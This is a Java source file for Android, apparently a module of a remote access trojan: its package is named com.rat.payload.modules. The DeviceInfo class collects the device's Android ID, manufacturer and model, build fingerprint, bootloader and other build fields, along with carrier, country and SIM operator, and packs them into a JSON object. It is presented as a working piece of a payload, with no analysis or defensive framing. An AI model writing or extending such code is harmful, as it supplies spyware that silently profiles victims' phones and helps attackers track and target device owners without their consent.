package com.rat.payload.modules;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import org.json.JSONObject;

public class DeviceInfo {

    public static String getDeviceId(Context ctx) {
        return Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID);
    }

    public static String getModel() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    public static JSONObject getFullInfo(Context ctx) {
        JSONObject info = new JSONObject();
        try {
            info.put("device_id", getDeviceId(ctx));
            info.put("model", getModel());
            info.put("brand", Build.BRAND);
            info.put("device", Build.DEVICE);
            info.put("product", Build.PRODUCT);
            info.put("android_version", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("fingerprint", Build.FINGERPRINT);
            info.put("board", Build.BOARD);
            info.put("hardware", Build.HARDWARE);
            info.put("host", Build.HOST);
            info.put("user", Build.USER);
            info.put("tags", Build.TAGS);
            info.put("type", Build.TYPE);
            info.put("bootloader", Build.BOOTLOADER);
            info.put("display", Build.DISPLAY);
            info.put("id", Build.ID);
            info.put("time", Build.TIME);
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                info.put("carrier", tm.getNetworkOperatorName());
                info.put("country", tm.getNetworkCountryIso());
                info.put("sim_operator", tm.getSimOperatorName());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return info;
    }
}
